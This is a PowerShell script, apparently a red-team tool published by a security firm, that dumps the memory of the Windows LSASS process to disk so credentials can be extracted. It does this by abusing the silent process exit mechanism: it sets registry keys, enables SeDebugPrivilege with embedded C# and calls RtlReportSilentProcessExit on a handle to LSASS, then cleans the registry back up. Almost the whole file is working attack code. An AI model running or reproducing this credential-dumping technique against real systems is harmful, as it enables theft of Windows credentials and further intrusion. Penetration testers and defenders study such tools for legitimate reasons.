<#
.SYNOPSIS
    PowerShell script to dump lsass.exe process memory to disk for credentials extraction via silent process exit mechanism.

.DESCRIPTION
    
	The script causes WerFault.exe to dump lsass.exe process memory to disk for credentials extraction via silent process exit mechanism without crasing lsass.exe.
	This technique is adapted from: https://github.com/deepinstinct/LsassSilentProcessExit


    Authors:    Ville Koch, Sylvain Heiniger, Compass Security Switzerland AG, https://www.compass-security.com/
    Version:    v1.0 (01.07.2021)

.LINK
    https://github.com/CompassSecurity/PowerLsassSilentProcessExit

.PARAMETER DumpMode
    0 - Call RtlSilentProcessExit on LSASS process handle
    1 - Call CreateRemoteThread on RtlSilentProcessExit on LSASS (Note, that this doesnt work in the current version...)

.PARAMETER DumpPath
    Path where the dumpfile shall be stored

.EXAMPLE
    PowerLsassSilentProcessExit.ps1 -DumpMode 0 -DumpPath C:\temp

#>
param([Parameter(Mandatory)][ValidateSet(0,1)][int]$DumpMode, [Parameter(Mandatory)][System.IO.FileInfo]$DumpPath)

# Define required registry keys
$paths = @(
    @{Path="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"; Name="lsass.exe"; Keys=@(
        @{Name="GlobalFlag"; Value=512; Type="Dword"}
    );};
    @{Path="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"; Name="SilentProcessExit"; Keys=@();};
    @{Path="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit"; Name="lsass.exe"; Keys=@(
        @{Name="ReportingMode"; Value=2; Type="Dword"};
        @{Name="LocalDumpFolder"; Value="$DumpPath"; Type="String"};
        @{Name="DumpType"; Value=2; Type="Dword"}
    );}
)


# Backup the registry keys and set the keys and values we need
try{
    Foreach ($path in $paths) {
        $FullPath = "$($path.Path)"+"\"+"$($path.name)"
        $Path.Exists = Test-Path $FullPath
        if ($Path.Exists -eq $False) {
            New-Item -Path $path.Path -Name $path.Name | Out-Null
        }
        Foreach ($key in $path.Keys) {
            $key.OldValue = Get-ItemProperty -Path $FullPath -Name $key.Name -ErrorAction SilentlyContinue
            if ($key.OldValue -eq $null) {
                New-ItemProperty -Path $FullPath -Name $key.Name -Value $key.Value -PropertyType $key.Type | Out-Null
            } else {
                $key.OldValue = $key.OldValue | select -ExpandProperty $key.Name
                Set-ItemProperty -Path $FullPath -Name $key.Name -Value $key.Value -Type $key.Type | Out-Null
            }
        }
    }    
}catch{
    Write-Warning "[WARN] Error happened during backup of registry keys! Error:`r`n"
    Write-Host $PSItem.Tostring()
    Exit 1
}

# Enable SeDebugPrivilege
## All Credit goes to Lee Holmes (@Lee_Holmes)
$definition = @'
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
namespace Set_TokenPermission
{
    public class SetTokenPriv
    {
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }
        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
        internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
        internal const int TOKEN_QUERY = 0x00000008;
        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        public static void EnablePrivilege()
        {
            bool retVal;
            TokPriv1Luid tp;
            IntPtr hproc = new IntPtr();
            hproc = Process.GetCurrentProcess().Handle;
            IntPtr htok = IntPtr.Zero;
            string priv = "SeDebugPrivilege"; 

            retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;
            retVal = LookupPrivilegeValue(null, priv, ref tp.Luid);
            retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);                              
            
        }
    }  
}
'@
    $type = Add-Type $definition -PassThru
    $type[0]::EnablePrivilege() 2>&1

# Importing the DLLs and adding definitions...
try{
    $NtdllDefinition = @"
    [DllImport("ntdll.dll", SetLastError=true)]public static extern uint RtlReportSilentProcessExit(IntPtr dwProcessHandle, uint dwExitStatus);
"@
    
    $Ntdll = Add-Type -MemberDefinition $NtdllDefinition -Name 'Ntdll' -Namespace 'Win32' -PassThru
    
    
    $Kernel32Definition = @"
    [DllImport("kernel32.dll")]public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    [DllImport("kernel32.dll")]public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
    [DllImport("kernel32.dll")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]public static extern IntPtr GetModuleHandle(string lpModuleName);
"@
    
    $Kernel32 = Add-Type -MemberDefinition $Kernel32Definition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
    
    
    $PROCESS_QUERY_LIMITED_INFORMATION = 0x00001000
    $PROCESS_VM_READ                   = 0x00000010
    $lsassId = (Get-Process -Name "lsass").Id
    $lsassHandle = $Kernel32::OpenProcess($PROCESS_QUERY_LIMITED_INFORMATION+$PROCESS_VM_READ, $False, $lsassId)
    
    if(($lsassHandle -eq -1) -or ($success -eq 0)){
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw "ERROR OpenProcess() failed with error: $LastError"
    }
}catch{
    Write-Warning "[WARN] Error happened during DLL import! Error:`r`n"
    Write-Host $PSItem.Tostring()
    Exit 1
}

# Dump LSASS
if($DumpMode -eq 0){
    try{
        $Ntdll::RtlReportSilentProcessExit($lsassHandle, 0) | out-null;
    }catch{
        Write-Warning "[WARN] Error happened during DumpMode 0! Error:`r`n"
        Exit 1
    }
}elseif($DumpMode -eq 1){
    try{
        #####################################
        #### DOES CURRENTLY NOT WORK! #######
        #####################################
        Write-Warning "Please note, that this DumpMode doesn't work currently..."
        $NtdllHandle = [Win32.Kernel32]::GetModuleHandle('ntdll.dll');
        [IntPtr]$RtlReportSilentProcessExitAddress = [Win32.Kernel32]::GetProcAddress($NtdllHandle, "RtlReportSilentProcessExit");
        $Success = $Kernel32::CreateRemoteThread($lsassHandle, [IntPtr]0, [UInt32]0, $RtlReportSilentProcessExitAddress, [IntPtr]::Zero, [UInt32]4, [ref]0);
        if(($Success -eq $null) -or ($success -eq 0)){
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            throw "ERROR CreateRemoteThread() failed with error: $LastError"
        }
    }catch{
        Write-Warning "[WARN] Error happened during DumpMode 1! Error:`r`n"
        Write-Host $PSItem.Tostring()
        Exit 1
    }
    
}else{
    Write-Warning "Should not end up here, DumpMode parameter validation failed..."
}

# Cleanup registry
try{
    Foreach ($path in $paths) {
        $FullPath = "$($path.Path)"+"\"+"$($path.name)"
        if ($Path.Exists -eq $False) {
            Remove-Item -Path $FullPath -Force -Recurse -ErrorAction SilentlyContinue
        } else {
            Foreach ($key in $path.Keys) {
                if ($key.OldValue -ne $null) {
                    Set-ItemProperty -Path $FullPath -Name $key.Name -Value $key.OldValue -Type $key.Type
                } else {
                    Remove-ItemProperty -Path $FullPath -Name $key.Name -Force -ErrorAction SilentlyContinue
                }
            }
        }
    }
}catch{
    Write-Warning "[WARN] Error happened during Cleanup of Registry! Error:`r`n"
    Write-Host $PSItem.Tostring()
    Exit 1
}